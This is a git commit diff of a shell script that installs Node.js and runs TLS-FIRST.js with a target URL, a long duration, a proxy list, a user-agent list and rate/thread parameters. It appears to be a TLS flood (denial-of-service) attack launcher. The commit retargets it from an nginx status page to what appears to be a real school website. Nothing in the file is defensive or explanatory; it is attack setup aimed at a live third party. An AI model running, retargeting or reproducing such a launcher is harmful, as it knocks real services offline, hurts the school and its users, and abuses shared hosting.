f659b240954e4238445315b90fe2e77f409265f1
hellovokzal <100135590+hellovokzal@users.noreply.github.com>
2023-06-07 20:42:20 +0500

    Update PlaywithDocker.sh

--- PlaywithDocker.sh
+++ PlaywithDocker.sh
@@ -6,4 +6,4 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://tls.mrrage.xyz/nginx_status 3000 proxy.txt ua.txt 15 64
+node TLS-FIRST.js https://school.72to.ru 3000 proxy.txt ua.txt 15 64
